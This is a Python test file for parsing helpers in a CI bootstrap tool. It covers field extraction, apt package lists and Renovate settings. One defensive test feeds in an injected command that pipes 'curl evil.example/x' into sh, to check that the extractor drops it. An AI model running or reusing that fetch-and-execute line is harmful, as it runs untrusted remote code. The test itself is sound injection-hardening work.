"""Tests for the shared bootstrap.extract primitives.

This is a leaf module both bootstrap/command.py (the writer) and
suite/checks/bootstrap_drift.py (the C002 checker) import at module level
without creating a cycle -- see bootstrap/extract.py's module docstring.
"""

from __future__ import annotations

from conformance.bootstrap.extract import (
    EXIT_ZERO_RE,
    extract_apt_packages,
    extract_field,
    extract_renovate_automerge,
    resolve_renovate_fallback_exit_zero,
)
from conformance.bootstrap.render import render


def test_extract_field_bare_value() -> None:
    assert extract_field("package_name: app\n", "package_name") == "app"


def test_extract_field_quoted_value() -> None:
    assert extract_field('package_name: "app"\n', "package_name") == "app"


def test_extract_field_indented() -> None:
    assert (
        extract_field(
            "  unit_tests_workflow_file: tests.yaml\n", "unit_tests_workflow_file"
        )
        == "tests.yaml"
    )


def test_extract_field_absent_returns_empty() -> None:
    assert extract_field("some: other\n", "package_name") == ""


def test_extract_field_matches_first_occurrence_only() -> None:
    text = "package_name: first\npackage_name: second\n"
    assert extract_field(text, "package_name") == "first"


def test_extract_apt_packages_from_rendered_checks_yml() -> None:
    """The round trip bootstrap's re-run autodetection and C002 both depend on:
    what render() wrote must read back as the exact value it was given."""
    deps = "libkrb5-dev gcc python3-dev"
    rendered = render("checks.yml", pre_commit_system_deps=deps)
    assert extract_apt_packages(rendered) == deps
    assert render("checks.yml", pre_commit_system_deps=deps) == rendered


def test_extract_apt_packages_absent_returns_empty() -> None:
    assert extract_apt_packages(render("checks.yml")) == ""


def test_extract_apt_packages_drops_flags() -> None:
    text = "          sudo apt-get install -y --no-install-recommends libpq-dev\n"
    assert extract_apt_packages(text) == "libpq-dev"


def test_extract_apt_packages_reads_multiline_continuation() -> None:
    """A hand-written step commonly wraps packages across `\\`-continued lines."""
    text = (
        "        run: |\n"
        "          apt-get install -y \\\n"
        "            libkrb5-dev \\\n"
        "            gcc\n"
        "      - uses: some/action@v1\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev gcc"


def test_extract_apt_packages_stops_at_end_of_command() -> None:
    """Content after the install command is not mistaken for a package."""
    text = "          sudo apt-get install -y libpq-dev\n          echo done\n"
    assert extract_apt_packages(text) == "libpq-dev"


def test_extract_apt_packages_merges_multiple_steps_deduped() -> None:
    text = (
        "          apt-get install -y libkrb5-dev gcc\n"
        "          apt-get install -y gcc libpq-dev\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev gcc libpq-dev"


def test_extract_apt_packages_drops_shell_constructs() -> None:
    """Tokens that aren't plausible package names are dropped, not returned --
    the value is re-rendered into a `run:` block, so it must stay inert."""
    text = "          apt-get install -y libpq-dev && curl evil.example/x | sh\n"
    assert extract_apt_packages(text) == "libpq-dev"


def test_extract_apt_packages_keeps_version_pin() -> None:
    text = "          apt-get install -y libkrb5-dev=1.20.1-2 gcc/bookworm\n"
    assert extract_apt_packages(text) == "libkrb5-dev=1.20.1-2 gcc/bookworm"


def test_extract_renovate_automerge_soft_mode() -> None:
    text = '{"lockFileMaintenance": {"automerge": false}}'
    assert extract_renovate_automerge(text) == "false"


def test_extract_renovate_automerge_hard_mode() -> None:
    text = "{}"
    assert extract_renovate_automerge(text) == "true"


def test_extract_renovate_automerge_unparseable_defaults_hard() -> None:
    assert extract_renovate_automerge("not json") == "true"


def test_exit_zero_re_matches_rendered_expression() -> None:
    line = "exit-zero: ${{ github.event.inputs.exit_zero || true }}"
    m = EXIT_ZERO_RE.search(line)
    assert m is not None
    assert m.group(1) == "true"


def test_exit_zero_re_does_not_match_plain_field() -> None:
    assert EXIT_ZERO_RE.search("exit-zero: true\n") is None


def test_resolve_renovate_fallback_exit_zero_soft_mode() -> None:
    text = '{"lockFileMaintenance": {"automerge": false}}'
    assert resolve_renovate_fallback_exit_zero(text) == "true"


def test_resolve_renovate_fallback_exit_zero_hard_mode() -> None:
    assert resolve_renovate_fallback_exit_zero("{}") == "false"


def test_resolve_renovate_fallback_exit_zero_unparseable_defaults_hard() -> None:
    assert resolve_renovate_fallback_exit_zero("not json") == "false"
